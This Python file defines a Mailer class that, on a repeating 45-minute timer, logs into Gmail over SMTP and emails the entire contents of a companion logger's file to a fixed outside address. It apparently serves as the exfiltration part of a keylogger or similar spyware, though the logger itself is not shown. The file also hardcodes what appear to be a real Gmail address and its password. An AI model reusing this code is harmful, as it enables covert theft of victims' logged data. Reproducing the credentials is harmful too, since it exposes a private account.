import smtplib
import threading


class Mailer:

    # How frequent will the mail be sent in minutes
    freq = 45

    # Default mail addresses and passwords
    from_addr = 'kitic.noob@gmail.com'
    from_addr_pwd = 'anic99a3dam'
    to_addr = 'anijovanovic@gmail.com'

    paused = False
    parent = None

    timer = None

    def __init__(self, parent, freq=45, from_addr='kitic.noob@gmail.com', from_addr_pwd='anic99a3dam',
                 to_addr='anijovanovic@gmail.com'):

        # Sets instance variables to the ones passed
        self.freq = freq
        self.from_addr = from_addr
        self.from_addr_pwd = from_addr_pwd
        self.to_addr = to_addr
        self.parent = parent

        # Starts the new thread
        t = threading.Thread(target=self.start)
        t.daemon = False
        t.start()

    def start(self):
        print('mailer.start')

        # Starts the timer and calls send() every *freq* minutes
        self.timer = threading.Timer(self.freq * 60, self.send)
        self.timer.start()

    def send(self):
        print('mailer.send')
        print('mailer paused:', self.paused)
        if not self.paused:
            try:
                # Opens the gmail server and log-ins to the account
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.ehlo()
                server.starttls()
                server.login(self.from_addr, self.from_addr_pwd)

                # Pauses the logger, sends the file, unpauses logger
                self.parent.logger.pause()
                log = open(self.parent.logger.path, 'r')
                server.sendmail(self.from_addr, self.to_addr, log.read())
                log.close()
                self.parent.logger.unpause()

                # Closes the connection
                server.close()

                print('mail sent')

                self.start()
            except smtplib.SMTPException:
                print('mail exception')
                self.start()

    def pause(self):
        print('mail.pause')
        self.timer.cancel()
        self.paused = True

    def unpause(self):
        print('mail.unpause')
        self.paused = False
        self.start()
